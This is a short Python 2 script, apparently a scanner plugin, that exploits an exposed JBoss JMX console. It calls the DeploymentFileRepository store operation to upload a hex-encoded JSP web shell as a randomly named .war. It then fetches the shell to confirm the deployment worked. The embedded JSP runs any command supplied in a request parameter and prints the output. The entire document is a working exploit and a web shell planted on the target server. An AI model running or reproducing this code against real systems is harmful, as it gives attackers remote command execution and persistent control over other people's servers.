#coding=utf-8
#author:wolf@future-sec
import urllib2
import time
import random
def random_str(len):
    str1=""
    for i in range(len):
        str1+=(random.choice("ABCDEFGH"))
    return str1
def run(host,port,timeout,auth):
    try:
        url = "http://%s:%d"%(host,int(port))
        shell="""<%@ page import="java.util.*,java.io.*"%> <% %> <HTML><BODY> <FORM METHOD="GET" NAME="comments" ACTION=""> <INPUT TYPE="text" NAME="comment"> <INPUT TYPE="submit" VALUE="Send"> </FORM> <pre> <% if (request.getParameter("comment") != null) { out.println("Command: " + request.getParameter("comment") + "<BR>"); Process p = Runtime.getRuntime().exec(request.getParameter("comment")); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %> </pre> </BODY></HTML>"""
        shellcode=""
        name=random_str(5)
        for v in shell:
            shellcode+=hex(ord(v)).replace("0x","%")
        deploy_url = url + "/jmx-console/HtmlAdaptor"
        post_data = "action=invokeOpByName&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodName=store&argType="+\
        "java.lang.String&arg0=%s.war&argType=java.lang.String&arg1=auto700&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3="%(name)+shellcode+\
        "&argType=boolean&arg4=True"
        request = urllib2.Request(deploy_url,post_data)
        request.add_header("Authorization",auth)
        res = urllib2.urlopen(request,timeout=timeout)
        time.sleep(10)
        webshell_url = "%s/%s/auto700.jsp"%(url,name)
        res = urllib2.urlopen(webshell_url,timeout=timeout)
        if 'comments' in res.read():
            info=" Auto deploy success:%s"%(webshell_url)
            return info
    except Exception,e:
        pass
